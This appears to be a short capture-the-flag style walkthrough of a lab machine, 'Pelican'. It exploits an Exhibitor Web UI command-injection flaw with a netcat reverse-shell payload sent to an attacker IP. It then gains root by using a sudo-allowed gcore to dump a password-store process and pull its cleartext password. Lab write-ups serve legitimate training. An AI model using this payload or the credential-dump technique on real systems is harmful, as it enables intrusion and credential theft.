# Pelican

### Enumeration

```
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
```

http://192.168.181.98:8080/exhibitor/v1/ui/index.html

Exhibitor Web UI 1.7.1 - Remote Code Execution

https://www.exploit-db.com/exploits/48654

### Initial Access

```
Config:
$(/bin/nc -e /bin/sh 192.168.49.181 80 &)
---
curl -X POST -d @data.json http://192.168.181.98:8080/exhibitor/v1/config/set
```

### PrivEsc

```
charles@pelican:~$ sudo -l

    (ALL) NOPASSWD: /usr/bin/gcore

charles@pelican:~$ sudo gcore $PID
```

Gcore is dumping a process with its PID value. So, if you have enough permission to execute it, you can get cleartext password from the process.

```
charles@pelican:/tmp/test$ ps aux | grep root
root       495  0.0  0.0   2276    72 ?        Ss   17:12   0:00 /usr/bin/password-store

charles@pelican:/tmp/test$ sudo gcore 495
sudo gcore 495
0x00007f50a9fce6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffccf6689b0, remaining=remaining@entry=0x7ffccf6689b0) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.495
[Inferior 1 (process 495) detached]

charles@pelican:/tmp/test$ strings core.495
...
001 Password: root:
[REDACTED]
...

charles@pelican:/tmp/test$ su root
```
